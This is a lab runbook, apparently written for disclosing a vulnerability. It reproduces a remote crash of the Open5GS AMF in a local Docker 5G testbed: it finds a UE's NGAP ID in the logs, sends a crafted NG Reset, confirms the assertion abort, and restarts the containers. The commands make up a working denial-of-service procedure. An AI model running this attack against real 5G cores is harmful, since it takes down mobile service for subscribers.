# Open5GS — NG Reset → remote AMF crash (T04) — the flagship DoS

Git Bash, from `ngap_tester/`. Terminals / live logs / how to verify: see [`../README.md`](../README.md).
**This crashes the AMF on purpose.**

**1. Core + RAN**
```bash
( cd ../5g-lab && ./scripts/core.sh up open5gs && ./scripts/ran.sh up ueransim open5gs )
```
**2. Victim with an ACTIVE PDU session** (the crash needs the release to be async)
```bash
docker exec ueransim-open5gs-ueransim-ue-1 sh -c "ping -I uesimtun0 -c1 -W2 8.8.8.8 >/dev/null && echo UE_ACTIVE"
V=$(docker logs o5gs-amf 2>&1 | grep 'ngap-handler.c:815' | grep -oE 'AMF_UE_NGAP_ID\[[0-9]+\]' | tail -1 | grep -oE '[0-9]+'); echo $V
```
**3. Capture + fire** (AMF-UE-ID-only forces the unbound path)
```bash
CFG_CORE=open5gs ./capture_attack.sh open5gs_T04_ng_reset_AMF_CRASH \
    o5gs-amf o5gs-smf ueransim-open5gs-ueransim-gnb-1 net-5glab 30 -- ng-reset --targets $V
```
**Expect:** NGAP **20** (NGReset→Ack) in `amf_ngap_nas_sbi.pcap`; `smf_sbi_pfcp.pcap` has the
nsmf/PFCP whose async completion fires the assertion; then `docker ps -a | grep o5gs-amf` →
**`Exited (134)`**, and `docker logs o5gs-amf | grep -iE 'Assertion|Aborted'` shows
`gnb->ng_reset_ack` (nsmf-handler.c:928). This is the evidence for the Open5GS issue.
**Restore (AMF is DOWN):**
```bash
docker restart o5gs-amf; sleep 6
docker restart ueransim-open5gs-ueransim-gnb-1; sleep 4
docker restart ueransim-open5gs-ueransim-ue-1
```
